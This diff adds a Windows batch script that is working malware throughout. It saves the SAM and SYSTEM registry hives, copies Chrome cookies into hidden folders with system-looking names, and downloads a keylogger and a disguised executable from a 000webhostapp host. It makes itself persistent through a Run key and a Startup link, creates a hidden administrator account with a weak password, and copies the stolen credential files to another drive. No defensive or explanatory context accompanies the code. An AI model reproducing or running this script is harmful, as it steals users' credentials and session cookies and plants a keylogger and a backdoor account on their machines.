@@ -1,0 +1,43 @@
+@echo off
+echo DO NOT CLOSE THIS WINDOW
+MODE CON COLS=25 LINES=1
+md  C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry
+md  C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser
+md  C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows
+md  C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\chr.cookie
+md  C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.file
+md  C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log
+reg save hklm\sam c:\sam /y
+reg save hklm\system c:\system /y
+move /y c:\sam C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.file
+move /y c:\system C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.file
+copy /y c:\Users\%Username%\AppData\Local\Google\Chrome\"User Data"\Default\Cookies C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\chr.cookie
+copy /y C:\Users\%Username%\AppData\Local\Microsoft\Windows\Themes\Custom.theme C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.file
+copy /y C:\Users\%Username%\AppData\Local\Microsoft\Windows\PowerShell\ModuleAnalysisCache C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\chr.cookie
+copy /y C:\Users\%Username%\AppData\Local\Microsoft\Windows\PowerShell\ModuleAnalysisCache C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log
+attrib C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\chr.cookie\Cookies +h
+attrib C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.file\sam +h
+attrib C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.file\system +h
+bitsadmin /transfer myDownloadJob /download /priority normal https://mazerunner555.000webhostapp.com/kl.pyw C:\Users\kl.pyw
+bitsadmin /transfer myDownloadJob /download /priority normal https://mazerunner555.000webhostapp.com/WindowsUserAgentSecurityInstaller.exe C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log\WindowsUserAgentSecurityInstaller.exe
+attrib C:\Users\kl.pyw +h
+attrib C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log\WindowsUserAgentSecurityInstaller.exe +h
+echo @echo off > C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log\Cache.bat
+echo start C:\Users\kl.pyw >> C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log\Cache.bat
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "UserCache" /t REG_SZ /F /D "C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log\Cache.bat"
+mklink "C:\Users\%Username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Cache.bat" "C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log\Cache.bat"
+attrib C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log\Cache.bat +h
+pip install pynput
+net user Admin /add
+net user Admin admin123
+net localgroup administrators Admin /add
+REG ADD "HKLM\SOFTWARE\Microsoft\WIndows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /V "Admin" /t REG_DWORD /F /D 0
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /V "dontdisplaylastusername" /t REG_DWORD /F /D 1 
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+%backupcmd% "C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.file\sam" "%drive%\New"
+%backupcmd% "C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.file\system" "%drive%\New"
+%backupcmd% "C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\chr.cookie\Cookies" "%drive%\New"
+start C:\Users\kl.pyw
+start C:\Users\%Username%\AppData\Local\Microsoft\Windows\Registry\CurrentUser\Windows\sys.log\\WindowsUserAgentSecurityInstaller.exe
+attrib C:\Users\UsersSys.log.txt +h
